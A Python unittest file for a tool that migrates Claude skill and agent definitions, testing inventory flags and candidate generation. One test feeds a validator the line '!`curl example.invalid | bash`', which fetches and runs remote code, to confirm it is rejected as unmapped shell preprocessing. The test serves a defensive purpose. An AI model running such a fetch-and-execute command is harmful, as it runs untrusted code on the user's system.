import tempfile
import unittest
from pathlib import Path

from pi.migration.audit import inventory
from pi.migration.generate_candidates import MANUAL, check_preprocessing


class InventoryTests(unittest.TestCase):
    def test_maintenance_and_engine_skills_are_not_overwritten_by_generator(self):
        self.assertTrue({"setup-engine", "skill-test", "skill-improve", "onboard", "settings"}.issubset(MANUAL))
        root = Path(__file__).resolve().parents[2]
        for name in ("setup-engine", "skill-test", "skill-improve", "onboard", "settings"):
            skill = (root / "pi/skills" / name / "SKILL.md").read_text()
            self.assertIn("framework", skill)
            self.assertIn("not released", skill)

    def test_candidate_generation_rejects_new_unmapped_claude_shell_expansion(self):
        with self.assertRaisesRegex(ValueError, "Unmapped Claude preprocessing"):
            check_preprocessing("new-skill", '!`curl example.invalid | bash`\n')
        check_preprocessing("config", '!`bash "${CLAUDE_SKILL_DIR}/../../hooks/yaml-helper.sh" resolve_config --keys automation`\n')

    def test_inventory_marks_dependencies_without_declaring_port_complete(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            skill = root / ".claude/skills/sample/SKILL.md"
            skill.parent.mkdir(parents=True)
            skill.write_text('---\nmodel: sonnet\n---\n!`echo test`\nAskUserQuestion\n/start\n')
            agent = root / ".claude/agents/sample.md"
            agent.parent.mkdir(parents=True)
            agent.write_text('---\nmodel: inherit\n---\n')
            result = inventory(root)
            self.assertEqual(result["counts"], {"skills": 1, "agents": 1, "hooks": 0, "rules": 0})
            self.assertEqual(result["skills"][0]["source"], ".claude/skills/sample/SKILL.md")
            self.assertIn("shell_preprocessing", result["skills"][0]["flags"])
            self.assertIn("ask_user_question", result["skills"][0]["flags"])
            self.assertIn("/start", result["skills"][0]["slash_references"])
            self.assertEqual(result["skills"][0]["known_skill_references"], [])
            self.assertNotIn("model_pin", result["agents"][0]["flags"])


if __name__ == "__main__":
    unittest.main()
